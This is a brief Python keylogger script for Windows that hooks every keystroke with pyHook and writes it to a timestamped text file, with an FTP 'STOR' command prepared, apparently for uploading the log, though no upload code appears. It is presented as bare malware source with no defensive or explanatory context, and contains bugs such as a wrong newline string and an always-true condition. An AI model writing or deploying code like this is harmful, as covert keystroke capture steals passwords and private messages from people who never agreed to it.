import win32api
import win32console
import win32gui
import pythoncom,pyHook
import ftplib
import time
import ftplib
s=time.strftime("%Y-%m-%d-%H %M")
vin=s+".txt"
vins="STOR "+s+".txt"
f=open(vin,'w+')
f.close()

def OnKeyboardEvent(event):
    if event.Ascii==5:
		exit(1)
    if event.Ascii !=0 or 8:

		f=open(vin,'r+')
		buffer=f.read()
		f.close()
		f=open(vin,'w')
		keylogs=chr(event.Ascii)
		if event.Ascii==13:
			keylogs='/n'
		buffer+=keylogs
		f.write(buffer)
		f.close()
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
